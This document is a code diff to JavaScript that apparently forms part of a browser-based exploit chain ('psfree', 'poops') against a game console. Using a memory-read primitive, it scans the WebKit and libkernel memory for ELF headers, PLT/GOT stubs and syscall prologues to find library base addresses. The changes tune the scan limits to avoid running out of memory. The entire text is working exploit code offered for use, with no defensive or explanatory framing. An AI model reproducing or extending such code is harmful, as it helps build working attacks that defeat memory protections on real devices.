@@ -26,6 +26,13 @@ const PF_R = 4;
 const PF_W = 2;
 const PF_X = 1;
 
+/** OOM-safe scan limits (13.52 poops base — no full-cap sweeps). */
+const LK_LOW_TEXT_MAX = 0x200000;
+const LK_ELF_RADIUS = 0x4000000n;
+const LK_HUNT_RADIUS = 0x2000000n;
+const LK_HDR_BACK_COARSE = 64;
+const LK_HDR_BACK_FINE = 256;
+
 const SS_LK_BASE = "wk-libkernelBase";
 const SS_IAT_RVA = "wk-imp-error-rva";
 
@@ -274,9 +281,17 @@ function findHeaderBackward(p, start, maxBack, step) {
     return null;
 }
 
-/** Resolve code base (RVA origin) + optional ELF img for phdr parse. */
-function resolveModuleLayout(p, hint) {
+/** Resolve code base (RVA origin) + optional ELF img. quick=true skips heavy backward walk. */
+let _modLayoutKey = "";
+let _modLayoutVal = null;
+
+function resolveModuleLayout(p, hint, opts) {
+    opts = opts || {};
     if (!hint) return null;
+    const key = String(hint) + (opts.deep ? ":d" : ":q");
+    if (!opts.nocache && key === _modLayoutKey && _modLayoutVal)
+        return _modLayoutVal;
+
     const codeBase = hint;
     const w0 = read4p(p, codeBase);
     const kind0 = classifyModulePage(w0);
@@ -292,33 +307,47 @@ function resolveModuleLayout(p, hint) {
     if (kind0 === "elf") {
         layout.hdr = codeBase;
         layout.img = codeBase;
+        _modLayoutKey = key;
+        _modLayoutVal = layout;
         return layout;
     }
     if (kind0 === "sce") {
         layout.hdr = codeBase;
         layout.img = codeBase.add32(SCE_ELF_OFF);
-        return layout;
-    }
-
-    let hit = findHeaderBackward(p, codeBase, 2048, 0x4000);
-    if (!hit) hit = findHeaderBackward(p, codeBase, 8192, 0x1000);
-    if (hit) {
-        layout.hdr = hit.hdr;
-        layout.kind = hit.kind;
-        layout.img = hit.kind === "sce" ? hit.hdr.add32(SCE_ELF_OFF) : hit.hdr;
-        layout.elfBack = true;
+        _modLayoutKey = key;
+        _modLayoutVal = layout;
         return layout;
     }
 
     if (kind0 === "text") {
         layout.poops = true;
         layout.kind = "text";
+        if (!opts.deep) {
+            _modLayoutKey = key;
+            _modLayoutVal = layout;
+            return layout;
+        }
     }
+
+    if (opts.deep) {
+        let hit = findHeaderBackward(p, codeBase, LK_HDR_BACK_COARSE, 0x4000);
+        if (!hit) hit = findHeaderBackward(p, codeBase, LK_HDR_BACK_FINE, 0x1000);
+        if (hit) {
+            layout.hdr = hit.hdr;
+            layout.kind = hit.kind;
+            layout.img = hit.kind === "sce" ? hit.hdr.add32(SCE_ELF_OFF) : hit.hdr;
+            layout.elfBack = true;
+            layout.poops = false;
+        }
+    }
+
+    _modLayoutKey = key;
+    _modLayoutVal = layout;
     return layout;
 }
 
 function moduleLoadBase(p, hint) {
-    const lay = resolveModuleLayout(p, hint);
+    const lay = resolveModuleLayout(p, hint, { quick: true });
     return lay ? lay.codeBase : hint;
 }
 
@@ -354,7 +383,7 @@ function u64Lo(w) {
 
 /** Parse PT_DYNAMIC — codeBase = poops/text RVA origin; img may be lower in memory. */
 function parseDynamicMeta(p, webkitBase) {
-    const layout = resolveModuleLayout(p, webkitBase);
+    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
     if (!layout || !layout.img) return null;
     const loadBase = layout.codeBase;
     const img = layout.img;
@@ -403,10 +432,11 @@ function parseDynamicMeta(p, webkitBase) {
     return null;
 }
 
-/** Runtime diagnostic — why dynamic GOT produced 0 usable slots. */
-export function diagnoseWebkitDynamic(p, webkitBase, off) {
+/** Runtime diagnostic — quick=1 read at base only (OOM-safe at scan start). */
+export function diagnoseWebkitDynamic(p, webkitBase, off, opts) {
+    opts = opts || {};
     const cap = iatCap(off);
-    const layout = resolveModuleLayout(p, webkitBase);
+    const layout = resolveModuleLayout(p, webkitBase, { quick: !opts.deep });
     const magic = read4p(p, webkitBase);
     const out = {
         hint: String(webkitBase),
@@ -421,9 +451,14 @@ export function diagnoseWebkitDynamic(p, webkitBase, off) {
         out.elfHdr = String(layout.hdr);
     if (!layout || !layout.img) {
         if (layout && layout.kind === "text")
-            out.reason = "poops text base (0xe5894855) — no ELF header in mapped mem";
+            out.reason = "poops text base — lite scan (low PLT, no ELF walk)";
         else
             out.reason = "no module header (kind=" + (layout ? layout.kind : "?") + ")";
+        return out;
+    }
+    if (!opts.deep) {
+        out.reason = "ELF hdr found — tap scan for dynamic GOT";
+        out.header = read4p(p, layout.hdr) === SCE_MAGIC ? "SCE" : "ELF";
         return out;
     }
     out.header = read4p(p, layout.hdr) === SCE_MAGIC ? "SCE" : "ELF";
@@ -657,7 +692,7 @@ function scanPltGotChunk(p, webkitBase, off, state) {
     }
 
     let batchBytes = 0;
-    while (state.cursor < state.endRva && batchBytes < 2048) {
+    while (state.cursor < state.endRva && batchBytes < 128) {
         const rva = state.cursor;
         const w0 = read4p(p, state.base.add32(rva));
         const w1 = read4p(p, state.base.add32(rva + 4));
@@ -748,7 +783,7 @@ function scanMappedExtPtrChunk(p, webkitBase, off, state) {
     }
 
     let batch = 0;
-    while (state.cursor < state.endRva && batch < 24) {
+    while (state.cursor < state.endRva && batch < 8) {
         const rva = state.cursor;
         state.cursor += 8;
         state.tried++;
@@ -817,8 +852,8 @@ function scanMappedExtPtrChunk(p, webkitBase, off, state) {
 }
 
 /** Direct libkernel base hunt — page-aligned mov eax;syscall prologue. */
-function scanLkPrologueChunk(p, off, sub, anchors) {
-    const RADIUS = 0x10000000n;
+function scanLkPrologueChunk(p, off, sub, anchors, radius) {
+    const RADIUS = radius != null ? radius : LK_HUNT_RADIUS;
     const STEP = 0x4000n;
 
     if (!anchors || !anchors.length)
@@ -837,7 +872,7 @@ function scanLkPrologueChunk(p, off, sub, anchors) {
     }
 
     let batch = 0;
-    while (sub.cursor <= sub.end && batch < 32) {
+    while (sub.cursor <= sub.end && batch < 8) {
         const addr = bigToPtr(sub.cursor);
         if (addr.hi >= 0x8 && lkAligned(addr)) {
             sub.probes++;
@@ -887,12 +922,12 @@ function isMovRaxImmStart(p, addr) {
 }
 
 /** Sparse getpid stub hunter ±128MB from anchor(s), 4KB steps. */
-function scanLibkernelStubChunk(p, webkitBase, off, sub, anchors) {
+function scanLibkernelStubChunk(p, webkitBase, off, sub, anchors, radius) {
     if (!anchors || !anchors.length) {
         return { done: true, lk: null, state: sub, phase: "stub-skip" };
     }
 
-    const RADIUS = 0x8000000n;
+    const RADIUS = radius != null ? radius : LK_HUNT_RADIUS;
     const STEP = 0x1000n;
 
     if (!sub) {
@@ -908,7 +943,7 @@ function scanLibkernelStubChunk(p, webkitBase, off, sub, anchors) {
     }
 
     let batch = 0;
-    while (sub.cursor <= sub.end && batch < 16) {
+    while (sub.cursor <= sub.end && batch < 8) {
         const addr = bigToPtr(sub.cursor);
         if (addr.hi >= 0x8) {
             sub.probes++;
@@ -961,24 +996,17 @@ function scanLibkernelStubChunk(p, webkitBase, off, sub, anchors) {
 }
 
 function syntheticTextRanges(off) {
-    const cap = iatCap(off);
-    return [{ lo: 0x1000, hi: cap, tag: "tx-poops" }];
+    return [{ lo: 0x1000, hi: LK_LOW_TEXT_MAX, tag: "tx-low" }];
 }
 
 function syntheticRwRanges(off) {
-    const cap = iatCap(off);
-    const ranges = [];
-    for (let lo = 0x80000; lo < cap; lo += 0x100000) {
-        const hi = Math.min(lo + 0x100000, cap);
-        if (hi - lo >= 0x1000) ranges.push({ lo, hi, tag: "rw-synth" });
-    }
-    return ranges;
+    return [{ lo: 0x80000, hi: 0x80000 + 0x20000, tag: "rw-lite" }];
 }
 
 /** PT_LOAD readable non-exec within cap — RELRO .got + writable data. */
 export function elfMappedGotRanges(p, webkitBase, off) {
     const cap = iatCap(off);
-    const layout = resolveModuleLayout(p, webkitBase);
+    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
     const img = layout && layout.img;
     if (!img) {
         if (layout && layout.poops) return syntheticRwRanges(off);
@@ -1021,11 +1049,10 @@ export function elfMappedRwRanges(p, webkitBase, off) {
     return elfMappedGotRanges(p, webkitBase, off);
 }
 
-/** PT_LOAD executable segments within mapped cap. */
-/** Executable PT_LOAD spans within cap (or full poops .text sweep). */
+/** Executable PT_LOAD spans within mapped cap (or low .text for poops). */
 export function elfMappedTextRanges(p, webkitBase, off) {
     const cap = iatCap(off);
-    const layout = resolveModuleLayout(p, webkitBase);
+    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
     const img = layout && layout.img;
     if (!img) {
         if (layout && (layout.poops || layout.kind === "text"))
@@ -1169,16 +1196,9 @@ export function resolveLibkernelDynamic(p, webkitBase, off, opts) {
     opts = opts || {};
     const log = opts.log || (() => {});
     const cap = iatCap(off);
-    const diag = diagnoseWebkitDynamic(p, webkitBase, off);
+    const diag = diagnoseWebkitDynamic(p, webkitBase, off, { deep: false });
     if (diag.reason !== "ok") {
-        log("LK-DYN", diag.reason
-            + " magic=" + diag.magic
-            + " loadBase=" + diag.loadBase
-            + (diag.total != null ? " total=" + diag.total + " inCap=" + diag.inCap : "")
-            + (diag.jmprel ? " jmprel=" + diag.jmprel : "")
-            + (diag.pltgot ? " pltgot=" + diag.pltgot : "")
-            + (diag.minRva ? " rva=" + diag.minRva + ".." + diag.maxRva : "")
-            + " cap=" + diag.cap);
+        log("LK-DYN", diag.reason + (diag.poops ? " poops=1" : "") + " cap=" + diag.cap);
         return { ok: false, error: diag.reason, diag };
     }
     const meta = parseDynamicMeta(p, webkitBase);
@@ -1335,7 +1355,7 @@ export function resolveLibkernelPsfree(p, webkitBase, off, opts) {
  * No static offsets — works without webkit dump or jailbreak.
  */
 function scanElfModulesChunk(p, webkitBase, off, sub, anchors) {
-    const RADIUS = 0x20000000n;
+    const RADIUS = LK_ELF_RADIUS;
     const STEP = 0x4000n;
     const MIN_SCORE = 8;
 
@@ -1363,7 +1383,7 @@ function scanElfModulesChunk(p, webkitBase, off, sub, anchors) {
 
     if (sub.phase === "scan") {
         let batch = 0;
-        while (sub.cursor <= sub.end && batch < 48) {
+        while (sub.cursor <= sub.end && batch < 8) {
             const addr = bigToPtr(sub.cursor);
             if (addr.hi >= 0x8) {
                 sub.pages++;
@@ -1494,7 +1514,7 @@ export function resolveLibkernelElfHunt(p, webkitBase, off, opts) {
 
 /** Chunked scan of low .text for ff 25 PLT stubs → libkernel base. */
 function scanPsfreePltChunk(p, webkitBase, off, state) {
-    const TEXT_CAP = 0x200000;
+    const TEXT_CAP = LK_LOW_TEXT_MAX;
 
     if (!state) {
         const base = moduleLoadBase(p, webkitBase);
@@ -1514,7 +1534,7 @@ function scanPsfreePltChunk(p, webkitBase, off, state) {
     }
 
     let batch = 0;
-    while (state.cursor < state.endRva && batch < 512) {
+    while (state.cursor < state.endRva && batch < 32) {
         const rva = state.cursor;
         if (read2p(p, state.base.add32(rva)) === 0x25ff
             || read2p(p, state.base.add32(rva)) === 0x15ff) {
@@ -1575,8 +1595,11 @@ function scanPsfreePltChunk(p, webkitBase, off, state) {
 export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
     opts = opts || {};
     if (!state) {
+        const layout = resolveModuleLayout(p, webkitBase, { quick: true });
+        const poopsLite = !!(layout && layout.poops && !layout.img);
         state = {
-            stage: "dyn",
+            stage: poopsLite ? "psfree" : "dyn",
+            poopsLite,
             sub: null,
             gotSlots: 0,
             pltRefs: 0,
@@ -1584,6 +1607,13 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
             anchors: null,
             psfreeTried: false,
         };
+        if (poopsLite) {
+            return {
+                done: false,
+                state,
+                phase: "lite-start",
+            };
+        }
     }
 
     if (!state.anchors) {
@@ -1709,6 +1739,16 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
             return Object.assign({ state }, c);
         }
         if (c.done) {
+            if (state.poopsLite) {
+                return {
+                    done: true,
+                    lk: null,
+                    state,
+                    phase: "lite-miss",
+                    refs: state.pltRefs,
+                    tried: c.tried,
+                };
+            }
             state.stage = "got";
             state.sub = null;
             return {
@@ -1723,6 +1763,9 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
     }
 
     if (state.stage === "got" || state.stage === "rw") {
+        if (state.poopsLite) {
+            return { done: true, lk: null, state, phase: "lite-miss" };
+        }
         const c = scanErrorIatChunk(p, webkitBase, off, state.sub);
         state.sub = c.state;
         if (c.slots != null) state.gotSlots = c.slots;
@@ -1745,6 +1788,10 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
     }
 
     if (state.stage === "base") {
+        if (state.poopsLite) {
+            state.done = true;
+            return { done: true, lk: null, state, phase: "lite-miss" };
+        }
         const c = scanLkPrologueChunk(p, off, state.sub, state.anchors);
         state.sub = c.state;
         if (c.done && c.lk) {
